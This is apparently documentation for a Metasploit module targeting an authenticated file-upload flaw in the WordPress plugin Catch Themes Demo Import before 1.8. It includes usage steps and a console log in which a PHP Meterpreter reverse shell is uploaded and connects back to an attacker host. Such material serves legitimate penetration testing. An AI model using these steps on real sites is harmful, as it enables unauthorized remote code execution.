## Vulnerable Application

The Wordpress Plugin Catch Themes Demo Import versions < 1.8 are vulnerable to authenticated
arbitrary file uploads via the import functionality found in the `~/inc/CatchThemesDemoImport.php`
file, due to insufficient file type validation.

Of note, the check functionality may not detect the version of `Catch Themes Demo Import` due
to the readme file not containing the proper version number line.

Re-exploitation may need a reboot of the server, or to wait an arbitrary timeout.

## Verification Steps

1. Install the plugin to wordpress
1. Start msfconsole
1. Do: `use exploits/multi/http/wp_catch_themes_demo_import`
1. Do: `set rhosts`
1. Do: `set username`
1. Do: `set password`
1. Do: `run`
1. You should get a shell.

## Options

### USERNAME

Username of the account which has post privileges. Defaults to `admin`.

### PASSWORD

Password of the account which has post privileges. Defaults to `admin`

## Scenarios

### Wordpress Catch Themes Demo Import 1.6.1 on Wordpress 5.4.8 running on Ubuntu 20.04

```
resource (catch_theme.rb)> use exploits/multi/http/wp_catch_themes_demo_import
[*] Using configured payload php/meterpreter/reverse_tcp
resource (catch_theme.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (catch_theme.rb)> set username admin
username => admin
resource (catch_theme.rb)> set password admin
password => admin
resource (catch_theme.rb)> set verbose true
verbose => true
resource (catch_theme.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (catch_theme.rb)> run
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/catch-themes-demo-import/readme.txt
[!] The service is running, but could not be validated. Could not identify the version number
[*] Ajax Nonce: 11a5dba010
[*] Uploading payload filename: Y5LBjS3t.php
[*] Triggering payload at wp-content/uploads/2021/12/Y5LBjS3t.php
[*] Sending stage (39282 bytes) to 2.2.2.2
[+] Deleted Y5LBjS3t.php
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:34002 ) at 2021-12-21 20:01:30 -0500

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : wordpress2004
OS          : Linux wordpress2004 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64
Meterpreter : php/linux
```
